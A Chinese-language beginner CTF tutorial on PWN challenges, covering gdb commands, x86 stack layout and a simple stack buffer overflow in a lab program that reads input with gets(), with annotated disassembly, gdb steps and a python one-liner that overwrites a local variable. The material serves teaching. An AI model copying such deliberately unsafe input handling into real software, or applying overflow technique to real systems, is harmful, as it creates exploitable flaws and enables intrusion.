PWN是一个黑客语法的俚语词，自"own"这个字引申出来的，这个词的含意在于，玩家在整个游戏对战中处在胜利的优势，或是说明竞争对手处在完全惨败的情形下，这个词习惯上在网络游戏文化主要用于嘲笑竞争对手在整个游戏对战中已经完全被击败（例如："You
just got pwned!"）。有一个非常著名的国际赛事叫做Pwn2Own，即通过打败对手来达到拥有的目的。

在CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。

又到了介绍工具的时候了！首先了解一下gdb。

gdb是Linux下常用的一款命令行调试器，拥有十分强大的调试功能。本实验中需要用到的gdb命令如下：

![图片1.png](https://image.3001.net/images/20210311/1615448719_6049ca8fa08499bacec79.png!small)

这个工具类似逆向里面的IDA这类的神器。

除了工具还需要知道一些简单的汇编基础，读懂常见的汇编指令是CTF竞赛中PWN解题的基本要求，本实验中需要理解的汇编指令如下：

![图片2.png](https://image.3001.net/images/20210311/1615448720_6049ca906e00f45d371c0.png!small)

汇编语言中，esp寄存器用于指示当前函数栈帧的栈顶的位置，函数中局部变量都存储在栈空间中，栈的生长方向是向下的（即从高地址往低地址方向生长）。

缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，使得溢出的数据覆盖在合法数据上，理想的情况是程序检查数据长度并不允许输入超过缓冲区长度的字符，但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。

本文涉及知识点实操练习：
[《CTFPWN练习》](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014103116591300001&pk_campaign=freebuf-wemedia)（PWN是CTF竞赛中的主要题型之一，主要考查参赛选手的逆向分析、漏洞挖掘以及Exploit编写能力。CTF-PWN系列实验以最常见的栈溢出为主线，通过由浅入深的方式，一步一步讲解栈溢出攻击原理与实践，同时详细介绍了Linux下GDB调试器的基本使用方法。）。

先看题目描述，跟看web源码一样重要，主机/home/test/1目录下有一个pwn1程序，执行这个程序的时候可以输入数据进行测试，pwn1程序会输出Please
try again.的提示信息，请对pwn1程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出Congratulations,
you pwned it.信息。

首先第一步源码审计在实际的CTF竞赛的PWN题目中，一般是不会提供二进制程序的源代码的。这里为了方便大家学习，给出二进制程序的C语言源代码供大家分析，以源码审计的方式确定漏洞所在位置，方便后续进行汇编级别的分析。

（在没有源代码的情况下，我们通常使用IDA Pro对二进制程序进行逆向分析，使用IDA的Hex-Rays插件可以将反汇编代码还原为C语言伪代码，可以达到类似源代码的可读效果，在后期的实验中会专门对IDA的使用进行讲解）

使用cd /home/test/1切换到程序所在目录，执行cat pwn1.c即可看到源代码：

``

    
    
    #include <stdio.h>
    
    int main(int argc, char argv)
    
    {
    
    int modified;
    
    char buffer[64];
    
    modified = 0;
    
    gets(buffer); // 引发缓冲区溢出
    
    if (modified != 0)
    
    {
    
    printf("Congratulations, you pwned it.\n");
    
    }
    
    else
    
    {
    
    printf("Please try again.\n");
    
    }
    
    return 0;
    
    }

````

我们看这里使用gets函数读取输入数据时，并不会对buffer缓冲区的长度进行检查，输入超长的输入数据时会引发缓冲区溢出。

漏洞找到了，我们来看利用过程执行gdb pwn1即可开始通过gdb对pwn1进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas
main命令即可：

![图片3.png](https://image.3001.net/images/20210311/1615448721_6049ca9111dcc0a088a17.png!small)

下面是对main函数中的汇编代码的解释：

``

    
    
    0x080482a0 <+0>: push %ebp
    
    0x080482a1 <+1>: mov %esp,%\ebp
    
    0x080482a3 <+3>: and $0xfffffff0,%\esp
    
    ; esp = esp - 0x60，即在栈上分配0x60）字节的空间
    
    0x080482a6 <+6>: sub $0x60,%\esp
    
    ; modified变量位于esp + 0x5C处，将其初始化为0
    
    0x080482a9 <+9>: movl $0x0,0x5c(%\esp)
    
    ; buffer位于esp + 0x1C处
    
    0x080482b1 <+17>: lea 0x1c(%\esp),%eax
    
    0x080482b5 <+21>: mov %eax,(%\esp)
    
    ; 调用gets(buffer)读取输入数据
    
    0x080482b8 <+24>: call 0x8049360 <gets>
    
    ; 判断modified变量的值是否是0
    
    0x080482bd <+29>: cmpl $0x0,0x5c(%\esp)
    
    ; 如果modified的值等于0，就跳转到 0x080482d2
    
    0x080482c2 <+34>: je 0x80482d2 <main+50>
    
    ; modified不为0，打印成功提示
    
    0x080482c4 <+36>: movl $0x80b3eec,(%\esp)
    
    0x080482cb <+43>: call 0x8049500 <puts>
    
    0x080482d0 <+48>: jmp 0x80482de <main+62>
    
    ; modified为0，打印失败提示
    
    0x080482d2 <+50>: movl $0x80b3f0b,(%\esp)
    
    0x080482d9 <+57>: call 0x8049500 <puts>
    
    0x080482de <+62>: mov $0x0,%\eax
    
    0x080482e3 <+67>: leave
    
    0x080482e4 <+68>: ret
    
    ``

``

通过对上面的汇编代码进行分析，我们知道buffer位于esp+0x1C处，而modified位于esp+0x5C处，两个地址的距离为0x5C - 0x1C
= 0x40，即64，刚好为buffer数组的大小。因此当我们输入的数据超过64字节时，modified变量就可以被覆盖。

下面在gdb中进行验证，在gdb中执行b 0x080482bd命令对gets的下一条指令下一个断点：

![图片4.png](https://image.3001.net/images/20210311/1615448721_6049ca91ca5ad2f4252d2.png!small)

在gdb中执行r命令，让被调试的pwn1程序跑起来，就可以输入数据进行测试了，这里我们输入64个A以及1个B（即AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB），按下Enter键程序就在断点处断下了：

![图片5.png](https://image.3001.net/images/20210311/1615448722_6049ca92c2dd1451d92dd.png!small)

在gdb中输入x
$esp+0x5C，查看modified变量的值已经被修改成了0x00000042，而0x42就是字符’B’的ASCII值，表明我们成功用输入数据的第65个字节覆盖了modified变量：

![image](https://image.3001.net/images/20210311/1615448643_6049ca43687fb126e5091.png!small)

在gdb中连续两次执行ni命令，可以看到je指令没有跳转，说明modified的值不为0，程序进入输出通过信息的if语句分支：

![图片7.png](https://image.3001.net/images/20210311/1615448723_6049ca9348c63e0796b54.png!small)

在gdb中输入c命令就可以让程序继续执行，看到输出了通过提示信息：

![图片8.png](https://image.3001.net/images/20210311/1615448723_6049ca93ea614bb633e13.png!small)

通过上面的步骤我们已经知道了如果控制输入数据来进行攻击，以达到进入if语句分支的目的。下面我们就可以通过构造输入数据进行攻击了。

如果你还没有退出gdb，输入q命令就可以退出gdb。下面通过python语句构造输入数据，然后通过管道传给pwn1程序，执行命令python -c
"print 'A'64+'B'" | ./pwn1

![图片9.png](https://image.3001.net/images/20210311/1615448724_6049ca94877e54629bf4a.png!small)

看到已经成功发起了溢出攻击，程序被你PWN掉啦！

